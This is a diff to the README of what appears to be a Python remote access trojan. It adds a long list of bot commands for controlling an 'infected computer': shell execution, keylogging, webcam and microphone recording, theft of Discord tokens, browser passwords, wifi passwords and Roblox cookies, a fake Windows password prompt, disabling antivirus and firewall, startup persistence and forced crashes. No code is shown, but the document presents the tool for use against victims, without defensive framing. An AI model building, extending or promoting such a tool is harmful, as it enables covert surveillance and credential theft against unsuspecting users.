@@ -34,7 +34,7 @@ Python3,Windows,linux
 ```
 Availaible commands are :
 --> /
---> /message = Show a message box displaying your text / Syntax  = "/message example"
+--> /msgbox = Show a message box displaying your text / Syntax  = "/message example"
 --> /shell = Execute a shell command /Syntax  = "/shell whoami"
 --> /camshot = Take a picture from the webcam
 --> /windowstart = Start logging current user window (logging is shown in the bot activity)
@@ -50,7 +50,7 @@ Availaible commands are :
 --> /wallpaper = Change infected computer wallpaper / Syntax = "/wallpaper url" 
 --> /clipboard = Retrieve infected computer clipboard content
 --> /startkeylogger = Starts a keylogger / Warning : Likely to trigger AV 
---> /stopkeylogger = Stops keylogger
+--> /deletekeylog = Stops keylogger
 --> /dumpkeylogger = Dumps the keylog
 --> /volumemax = Put volume at 100%
 --> /volumezero = Put volume at 0%
@@ -60,6 +60,55 @@ Availaible commands are :
 --> /screenshot = Get the screenshot of the user's current screen
 --> /exit = Exit program
 --> /kill = Kill a session or all sessions except current one / Syntax = "!kill session-3" or "!kill all"
+--> /startngrok = start a ngrok port forwarding
+--> /stopngrok = stop ngrok
+--> /ngroklink = send the ngrok link
+--> /discordtoken = send discord tokens
+--> /webwindow = show custom window with a web (this will not show web link)
+--> /python = python interpreter
+--> /webcam = record webcam
+--> /recmic = record mic
+--> /wallpaper = change wallpaper
+--> /write = write a custom text
+--> /hokeys = press keys "alt + f4"
+--> /ademincheck = check if you are admin
+--> /idletime = get the time
+--> /adminrequest = this will ask for admin
+--> /adminforce = will try to get admin (work bad)
+--> /startup = add to regg name
+--> /winphishing = will put a windows to ask password
+--> /passwords = take all browse passwords
+--> /streamcam = send a lot of cam images
+--> /stopcam = stopstream cam
+--> /streamscreen = stream screen
+--> /stopscreen = stop screenstream
+--> /shutdown 
+--> /restart
+--> /logout = log out of user
+--> /critproc = uncritproc the program
+--> /uncritproc = uncritproc the program
+--> /distaskmgr
+--> /entaskmgr
+--> /wifipass
+--> /history = take browser history
+--> /bluescreen
+--> /cirrentdir = current directory
+--> /displaydir = display directory
+--> /listProcess
+--> /killProcess
+--> /diasableAntivirus
+--> /diasableFireWall
+--> /selfDestruct
+--> /displayoff = turn off screen
+--> /displayon = turn on screen
+--> /ejectCD
+--> /retractCD
+--> /cd
+--> /notify = send desktop notification
+--> /winsound = play a sound in custop path
+--> /robloxCookie = get all roblox cookies
+--> /gotHacked = show tons of windows with text
+--> /victims = send all active rats
 ```
 
 
